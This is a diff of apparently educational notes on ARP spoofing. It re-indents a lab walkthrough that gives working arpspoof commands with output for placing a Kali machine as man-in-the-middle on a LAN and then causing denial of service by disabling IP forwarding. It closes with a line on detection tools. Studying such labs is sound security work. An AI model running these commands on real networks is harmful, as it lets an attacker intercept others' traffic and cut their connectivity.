@@ -1,3 +1,6 @@
+ARP spoofing
+#BASICS
+
 In computer networking, ARP spoofing (also ARP cache poisoning or ARP poison routing) is a technique 
 by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area 
 network. Generally, the aim is to associate the attacker's MAC address with the IP address of 
@@ -127,58 +130,58 @@ Ctrl-C in arpspoof to restore the initial ARP table.
 >@0. Kali will be the MITM (Man In The Middle).
 >@
 >@1. Enable the IP forwarding on the Kali machine.
->@$ sudo sh
->@# echo "1" > /proc/sys/net/ipv4/ip_forward
->@$ cat /proc/sys/net/ipv4/ip_forward
->@>>> The IP forwarding is now enabled on Kali.
+>@ $ sudo sh
+>@ # echo "1" > /proc/sys/net/ipv4/ip_forward
+>@ $ cat /proc/sys/net/ipv4/ip_forward
+>@ >>> The IP forwarding is now enabled on Kali.
 >@
 >@2. Find the LAN gateway, the MAC Address and the interface on Kali.
->@$ route -n
->@---
->@Table de routage IP du noyau
->@Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
->@0.0.0.0         192.168.8.1     0.0.0.0         UG    100    0        0 eth0
->@---
->@>>> The gateway is 192.168.8.1 (<gw IP addr>).
->@>>> The interface is eth0.
+>@ $ route -n
+>@ ---
+>@ Table de routage IP du noyau
+>@ Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
+>@ 0.0.0.0         192.168.8.1     0.0.0.0         UG    100    0        0 eth0
+>@ ---
+>@ >>> The gateway is 192.168.8.1 (<gw IP addr>).
+>@ >>> The interface is eth0.
 >@
->@$ ip addr
->@>>> The MAC addres of Kali is 08:00:27:6e:13:6e
+>@ $ ip addr
+>@ >>> The MAC addres of Kali is 08:00:27:6e:13:6e
 >@
 >@3. Perform the attack.
 >@* Check the ARP table on the target:
->@$ arp -a
->@---
->@console.gl-inet.com (192.168.8.1) at 94:83:c4:02:54:01 [ether] on eth0
->@---
+>@ $ arp -a
+>@ ---
+>@ console.gl-inet.com (192.168.8.1) at 94:83:c4:02:54:01 [ether] on eth0
+>@ ---
 >@
 >@* Performs the attack on Kali:
->@$ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
->@---
->@8:0:27:6e:13:6e 8:0:27:e4:e8:4c 0806 42: arp reply 192.168.8.1 is-at 8:0:27:6e:13:6e
->@8:0:27:6e:13:6e 94:83:c4:2:54:1 0806 42: arp reply 192.168.8.225 is-at 8:0:27:6e:13:6e
->@---
->@>>> ARP spoofing. 
->@  To 08:00:27:e4:e8:4c (the target): the MAC of 192.168.8.1 (the gw) is-at 08:00:27:6e:13:6e (kali)
->@  To 94:83:c4:02:54:01 (the gw):     the MAC of 192.168.8.225 (the target) is-at 08:00:27:6e:13:6e (kali)
->@>>> Kali is the MITM.  All the traffic now pass through Kali.
+>@ $ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
+>@ ---
+>@ 8:0:27:6e:13:6e 8:0:27:e4:e8:4c 0806 42: arp reply 192.168.8.1 is-at 8:0:27:6e:13:6e
+>@ 8:0:27:6e:13:6e 94:83:c4:2:54:1 0806 42: arp reply 192.168.8.225 is-at 8:0:27:6e:13:6e
+>@ ---
+>@ >>> ARP spoofing. 
+>@   To 08:00:27:e4:e8:4c (the target): the MAC of 192.168.8.1 (the gw) is-at 08:00:27:6e:13:6e (kali)
+>@   To 94:83:c4:02:54:01 (the gw):     the MAC of 192.168.8.225 (the target) is-at 08:00:27:6e:13:6e (kali)
+>@ >>> Kali is the MITM.  All the traffic now pass through Kali.
 >@
 >@* Check the result on the target:
->@$ arp -a
->@---
->@? (192.168.8.1) at 08:00:27:6e:13:6e [ether] on eth0
->@---
->@>>> The MAC addr of gw has changed for Kali's one.
+>@ $ arp -a
+>@ ---
+>@ ? (192.168.8.1) at 08:00:27:6e:13:6e [ether] on eth0
+>@ ---
+>@ >>> The MAC addr of gw has changed for Kali's one.
 >@
 >@4. Perform a DoS attack on Kali
->@$ sudo sh
->@# echo "0" > /proc/sys/net/ipv4/ip_forward
->@>>> no ip forwarding anymore.
->@>>> The distance machine now suffers a DoS attack. No internet connection at all.
+>@ $ sudo sh
+>@ # echo "0" > /proc/sys/net/ipv4/ip_forward
+>@ >>> no ip forwarding anymore.
+>@ >>> The distance machine now suffers a DoS attack. No internet connection at all.
 >@
 >@5. Stop the attack on Kali an restore ARP tables.
->@Ctrl-C in arpspoof to restore the initial ARP table.
->@>>> Ouf, attack ended ;) !
+>@ Ctrl-C in arpspoof to restore the initial ARP table.
+>@ >>> Ouf, attack ended ;) !
 >@
 >@-> How to prevent yourself from ARP spoofing
 >@  -Use tools like ARP-Watch (Linux) or X-ARP (Win) to detect suspicious activity.
